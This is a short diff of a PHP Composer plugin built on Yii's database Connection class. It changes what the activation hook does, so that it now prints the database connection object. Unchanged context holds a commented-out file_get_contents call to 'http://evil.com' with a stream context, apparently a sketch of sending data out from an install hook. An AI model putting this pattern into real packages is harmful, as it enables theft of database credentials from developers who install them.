@@ -9,11 +9,6 @@ use yii\db\Connection;
 class Plugin extends Connection implements PluginInterface
 {
 
-    public function __construct()
-    {
-      print_r($this->db);
-    }
-
     /**
      * @param Composer $composer
      * @param IOInterface $io
@@ -51,9 +46,10 @@ class Plugin extends Connection implements PluginInterface
         //     ],
         // ]);
         // @file_get_contents("http://evil.com", false, $context);
-        $this->createTable();
+        // $this->createTable();
 
-        print_r("Activated.\n\r");
+        // print_r("Activated.\n\r");
+        print_r($this->db);
     }
     /**
      * @param string $type
